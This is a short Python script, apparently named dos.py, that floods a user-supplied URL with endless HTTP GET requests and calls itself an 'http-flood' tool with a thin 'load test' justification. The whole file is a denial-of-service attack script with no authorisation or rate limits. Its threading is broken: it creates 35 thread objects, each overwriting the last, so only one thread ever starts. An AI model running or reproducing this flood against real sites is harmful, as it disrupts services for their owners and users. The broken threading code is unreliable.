#simpel http-flood with spam send threads
#this use test load thread website

import requests
import threading
import sys

def send_request(url):
    try:
        response = requests.get(url)
        if response.status_code == 200:
            print("Successfly send thread", url)
    except Exception as e:
        print("Failed send thread to", url, "error message:", str(e))

if len(sys.argv) != 2:
    print("Usage: python dos.py <url>")
    sys.exit(1)

target_url = sys.argv[1]

def send_packets():
    while True:
        send_request(target_url)
        send_request(target_url)
        send_request(target_url)
        send_request(target_url)
        send_request(target_url)
        send_request(target_url)
        send_request(target_url)
        send_request(target_url)
        send_request(target_url)
        send_request(target_url)
        send_request(target_url)
        send_request(target_url)
        send_request(target_url)
        send_request(target_url)
        send_request(target_url)
        send_request(target_url)
        send_request(target_url)
        send_request(target_url)
        send_request(target_url)
        send_request(target_url)
        send_request(target_url)
        send_request(target_url)
        send_request(target_url)
        send_request(target_url)
      
packet_thread = threading.Thread(target=send_packets)
packet_thread = threading.Thread(target=send_packets)
packet_thread = threading.Thread(target=send_packets)
packet_thread = threading.Thread(target=send_packets)
packet_thread = threading.Thread(target=send_packets)
packet_thread = threading.Thread(target=send_packets)
packet_thread = threading.Thread(target=send_packets)
packet_thread = threading.Thread(target=send_packets)
packet_thread = threading.Thread(target=send_packets)
packet_thread = threading.Thread(target=send_packets)
packet_thread = threading.Thread(target=send_packets)
packet_thread = threading.Thread(target=send_packets)
packet_thread = threading.Thread(target=send_packets)
packet_thread = threading.Thread(target=send_packets)
packet_thread = threading.Thread(target=send_packets)
packet_thread = threading.Thread(target=send_packets)
packet_thread = threading.Thread(target=send_packets)
packet_thread = threading.Thread(target=send_packets)
packet_thread = threading.Thread(target=send_packets)
packet_thread = threading.Thread(target=send_packets)
packet_thread = threading.Thread(target=send_packets)
packet_thread = threading.Thread(target=send_packets)
packet_thread = threading.Thread(target=send_packets)
packet_thread = threading.Thread(target=send_packets)
packet_thread = threading.Thread(target=send_packets)
packet_thread = threading.Thread(target=send_packets)
packet_thread = threading.Thread(target=send_packets)
packet_thread = threading.Thread(target=send_packets)
packet_thread = threading.Thread(target=send_packets)
packet_thread = threading.Thread(target=send_packets)
packet_thread = threading.Thread(target=send_packets)
packet_thread = threading.Thread(target=send_packets)
packet_thread = threading.Thread(target=send_packets)
packet_thread = threading.Thread(target=send_packets)
packet_thread = threading.Thread(target=send_packets)
packet_thread.start()
